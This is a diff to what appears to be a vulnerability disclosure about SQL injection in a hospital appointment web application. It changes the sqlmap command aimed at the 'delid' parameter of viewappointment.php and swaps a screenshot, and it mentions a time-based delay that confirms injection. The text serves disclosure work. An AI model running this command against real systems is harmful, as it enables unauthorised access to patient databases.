@@ -98,7 +98,7 @@ The page will delay its response by 5 seconds, confirming that arbitrary SQL cod
 bash
 
 ```
-sqlmap -u "http://[target]/Hospital/viewappointment.php?delid=1" --dbs
+sqlmap -u "http://[target]/Hospital/viewappointment.php?delid=1" --level 3
 ```
 
 
@@ -111,7 +111,7 @@ sqlmap -u "http://[target]/Hospital/viewappointment.php?delid=1" --dbs
 
 ![image-20260417014714863](images/image-20260417014714863.png)
 
-![image-20260417015419683](images/image-20260417015419683.png)
+![image-20260417020549868](images/image-20260417020549868.png)
 
 ## Impact
 
